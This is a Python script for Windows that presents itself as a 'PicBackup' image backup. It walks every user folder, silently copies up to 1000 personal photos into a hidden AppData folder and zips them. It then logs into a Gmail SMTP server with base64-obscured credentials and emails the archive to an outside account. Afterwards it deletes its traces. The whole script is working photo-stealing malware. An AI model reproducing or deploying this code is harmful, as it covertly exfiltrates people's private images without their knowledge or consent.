#!/usr/bin/env python3
import os
import zipfile
import shutil
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import socket
import base64
class WIN_Geat:
    def __init__(self):
        
        self.Images_CO()
        self.Email_send()
    def Images_CO(self):
        self.Ecode  = 'HGbGbkgkfjudjdjdudjdmmmdjd=='             
        self.Scode  = ';fkfkf,fjkfjfmfmfjfmfjfmfjfjf=='
        count = 0
        if os.path.exists(os.environ["appdata"] +'\\PicBackup' ) :
           shutil.rmtree(os.environ["appdata"] +'\\PicBackup', ignore_errors=False, onerror=None)
           os.mkdir(os.environ["appdata"] +'\\PicBackup') 
           os.chdir(os.environ["appdata"] +'\\PicBackup')
           
        else:    
           os.mkdir(os.environ["appdata"] +'\\PicBackup')
           os.chdir(os.environ["appdata"] +'\\PicBackup')
        count = 0    
        for (root,dirs,Filesa) in os.walk('C:\\Users'): 
                  for Files in Filesa  :
                     if 'OneDriveMedTile' in Files or 'Microsoft.Windows' in Files or  'VisualElements'in Files\
                        or 'Square44x44Logo' in Files or 'Microsoft.Windows' in Files or 'aboutIcon' in Files\
                        or 'accountIcon' in Files or 'chevronUp' in Files or 'ic_fluent_add' in Files\
                        or 'notificationsIcon' in Files or 'syncIcon' in Files or 'RainierSunset' in Files or 'CachedImage' in Files\
                        or '5c61d427e791efb' in Files or '28fed39013f5f' in Files or 'AppData' in root  :
                        pass
                     else:
                       if '.jpg' in Files or '.png' in Files or '.jpeg' in Files\
                          or '.webp' in Files  :
                            with open(root+'\\'+Files,'rb') as pic:
                                readpic = pic.read()
                            with open(Files,'wb') as pic:
                                pic.write(readpic)
                            count +=1     
                            if count == 1000 :
                                break
        shutil.make_archive(os.environ["appdata"] +'\\PicBackup', "zip",os.environ["appdata"] +'\\PicBackup'  )
        shutil.rmtree(os.environ["appdata"] +'\\PicBackup', ignore_errors=True, onerror=None)
    def Email_send(self):
          msg = MIMEMultipart()
          msg['From'] ='jacstory'
          msg['To'] ='jacstory'
          msg['Subject'] = "IMages Safe ".upper()
          socket_id= socket.gethostname()
          msg.attach(MIMEText('PicBackup','plain'))   
          attachment= open (os.environ["appdata"]+'\\PicBackup.zip','rb')
          filename ='PicBackup.zip'
          part = MIMEBase('application','octect-stream')
          part.set_payload((attachment).read())
          encoders.encode_base64(part)
          part.add_header('content-disposition','attachment;filename='+str(filename))
          msg.attach(part)
          text = msg.as_string()
          SERVER = smtplib.SMTP('smtp.gmail.com',587)
          SERVER.ehlo()
          SERVER.starttls()
          SERVER.ehlo()
          SERVER.login(base64.b64decode(self.Ecode).decode("utf-8") ,base64.b64decode(self.Scode).decode("utf-8") )
          SERVER.sendmail(base64.b64decode(self.Ecode).decode("utf-8"),base64.b64decode(self.Ecode).decode("utf-8") , text)
          attachment.close()
          SERVER.close()
          shutil.rmtree(os.environ["appdata"] +'\\PicBackup.zip', ignore_errors=True, onerror=None)
if __name__=='__main__':
    WIN_Geat()
       
       






